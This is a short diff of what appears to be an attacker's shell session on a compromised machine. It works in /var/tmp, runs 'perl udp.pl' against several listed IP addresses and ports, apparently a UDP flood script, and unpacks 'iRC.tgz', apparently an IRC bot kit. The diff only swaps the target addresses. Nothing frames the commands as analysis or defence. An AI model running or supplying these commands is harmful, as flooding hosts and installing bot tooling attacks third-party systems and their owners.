@@ -1,9 +1,9 @@
 cd /var/tmp
 ls
-perl udp.pl 109.232.63.28 0 0
-perl udp.pl 118.78.208.120 8000 0
-perl udp.pl 189.36.15.36 0 0
-perl udp.pl 26.33.88.130 0 0
+perl udp.pl 73.111.92.224 0 0
+perl udp.pl 157.189.10.3 8000 0
+perl udp.pl 249.145.187.89 0 0
+perl udp.pl 7.230.188.60 0 0
 ls
 tar xzvf iRC.tgz
 cd a
